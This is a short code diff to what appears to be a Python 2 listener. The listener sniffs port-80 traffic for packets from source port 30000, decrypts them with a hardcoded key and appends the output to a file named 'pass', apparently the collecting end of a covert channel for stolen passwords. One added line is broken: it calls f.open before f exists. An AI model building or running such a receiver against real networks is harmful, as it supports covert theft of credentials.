@@ -17,11 +17,14 @@ def decrypt(key, msg):
 	
 def main(argv):
 	key = ':Yjds52%9wnsjp>)'
+	f.open('pass', 'r')
+	f.close()
 	msg = []
 	while 1:
 		recieved = sniff(filter="tcp and port 80", count=1)
 		if recieved[0].sport == 30000:
 			clear = decrypt(key, str(msg))
+			print 'Recieved: '+ clear
 			f = open('pass', 'a')
 			f.write(clear)
 			f.close()
